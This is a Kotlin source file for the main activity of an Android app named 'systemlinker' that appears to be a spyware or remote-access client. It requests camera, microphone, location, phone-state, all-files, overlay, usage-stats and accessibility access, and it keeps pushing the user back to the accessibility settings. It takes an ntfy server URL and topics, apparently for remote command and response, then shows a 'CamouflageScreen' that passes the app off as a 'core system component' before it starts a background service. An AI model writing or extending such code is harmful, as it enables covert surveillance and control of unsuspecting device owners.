package com.systemlinker

import android.Manifest
import android.app.AppOpsManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.text.TextUtils
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.core.content.ContextCompat
import com.systemlinker.base.ConfigStore
import com.systemlinker.base.SystemLinkerService
import com.systemlinker.features.systemacc.SystemAccessibility
import com.systemlinker.ui.theme.AppTheme
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MainActivity : ComponentActivity() {

    private var customFlowStep = 0
    private lateinit var configStore: ConfigStore

    private val requiredPermissions = mutableListOf(
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_PHONE_STATE
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            add(Manifest.permission.BLUETOOTH_CONNECT)
            add(Manifest.permission.BLUETOOTH_SCAN)
        }
    }.toTypedArray()

    private val requestPermissionLauncher = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
        if (hasAllRuntimePermissions()) {
            if (checkAndRequestNextPermission()) {
                checkConfigAndStart()
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        configStore = ConfigStore(this)
        
        if (!hasAllRuntimePermissions()) {
            requestPermissionLauncher.launch(requiredPermissions)
        }
        
        setContent {
            AppTheme {
                if (!configStore.isConfigured) {
                    SetupScreen()
                } else {
                    CamouflageScreen()
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        if (hasAllRuntimePermissions() && configStore.isConfigured) {
            if (checkAndRequestNextPermission()) {
                startServiceAndFinish()
            }
        }
    }

    private fun checkConfigAndStart() {
        if (configStore.isConfigured) {
            startServiceAndFinish()
        }
    }
    
    private fun hasAllRuntimePermissions(): Boolean {
        return requiredPermissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun hasUsageStatsPermission(): Boolean {
        val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            appOps.unsafeCheckOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
        } else {
            @Suppress("DEPRECATION")
            appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
        }
        return mode == AppOpsManager.MODE_ALLOWED
    }

    private fun isAccessibilityEnabled(): Boolean {
        var accessibilityEnabled = 0
        val service = packageName + "/" + SystemAccessibility::class.java.canonicalName
        try {
            accessibilityEnabled = Settings.Secure.getInt(applicationContext.contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED)
        } catch (e: Settings.SettingNotFoundException) {}
        val colonSplitter = TextUtils.SimpleStringSplitter(':')
        if (accessibilityEnabled == 1) {
            val settingValue = Settings.Secure.getString(applicationContext.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
            if (settingValue != null) {
                colonSplitter.setString(settingValue)
                while (colonSplitter.hasNext()) {
                    if (colonSplitter.next().equals(service, ignoreCase = true)) return true
                }
            }
        }
        return false
    }

    private fun checkAndRequestNextPermission(): Boolean {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            startActivity(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:$packageName")))
            return false
        }

        if (!Settings.canDrawOverlays(this)) {
            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
            return false
        }

        if (!hasUsageStatsPermission()) {
            startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
            return false
        }

        if (!isAccessibilityEnabled()) {
            when (customFlowStep) {
                0 -> { customFlowStep = 1; startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)); return false }
                1 -> { customFlowStep = 2; startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:$packageName"))); return false }
                2 -> { customFlowStep = 3; startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)); return false }
                else -> { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)); return false }
            }
        }
        return true
    }

    private fun startServiceAndFinish() {
        val serviceIntent = Intent(this, SystemLinkerService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(serviceIntent)
        else startService(serviceIntent)
        finish()
    }

    @Composable
    fun SetupScreen() {
        var ntfyUrl by remember { mutableStateOf(configStore.ntfyUrl) }
        var clientTopic by remember { mutableStateOf(configStore.ntfyTopic) }
        var serverTopic by remember { mutableStateOf(configStore.ntfyServerTopic) }

        Surface(modifier = Modifier.fillMaxSize(), color = MaterialTheme.colorScheme.background) {
            Column(modifier = Modifier.padding(24.dp), verticalArrangement = Arrangement.Center) {
                Text("Initial Deployment", style = MaterialTheme.typography.headlineMedium, color = MaterialTheme.colorScheme.primary)
                Spacer(modifier = Modifier.height(16.dp))
                OutlinedTextField(value = ntfyUrl, onValueChange = { ntfyUrl = it }, label = { Text("Ntfy Instance URL") }, modifier = Modifier.fillMaxWidth())
                Spacer(modifier = Modifier.height(8.dp))
                OutlinedTextField(value = clientTopic, onValueChange = { clientTopic = it }, label = { Text("Client Topic (Listen)") }, modifier = Modifier.fillMaxWidth())
                Spacer(modifier = Modifier.height(8.dp))
                OutlinedTextField(value = serverTopic, onValueChange = { serverTopic = it }, label = { Text("Server Topic (Response)") }, modifier = Modifier.fillMaxWidth())
                Spacer(modifier = Modifier.height(24.dp))
                Button(
                    onClick = {
                        configStore.ntfyUrl = ntfyUrl
                        configStore.ntfyTopic = clientTopic
                        configStore.ntfyServerTopic = serverTopic
                        configStore.isConfigured = true
                        if (checkAndRequestNextPermission()) startServiceAndFinish()
                    },
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Text("INITIALIZE PROTOCOL")
                }
            }
        }
    }
}

@Composable
fun CamouflageScreen() {
    Surface(
        modifier = Modifier.fillMaxSize(),
        color = MaterialTheme.colorScheme.background
    ) {
        Column(modifier = Modifier.fillMaxSize().padding(24.dp)) {
            Text("System Sync Provider", style = MaterialTheme.typography.headlineMedium, fontWeight = FontWeight.Bold, color = MaterialTheme.colorScheme.onBackground)
            Spacer(modifier = Modifier.height(16.dp))
            Text("This is a core system component required for background data synchronization and configuration management.", style = MaterialTheme.typography.bodyLarge, color = MaterialTheme.colorScheme.onSurfaceVariant)
            Spacer(modifier = Modifier.height(32.dp))
            HorizontalDivider()
            Spacer(modifier = Modifier.height(32.dp))
            Text("Status: Active", style = MaterialTheme.typography.bodyMedium, color = MaterialTheme.colorScheme.primary)
            val date = SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault()).format(Date())
            Text("Last Configuration Check: $date", style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onSurfaceVariant)
        }
    }
}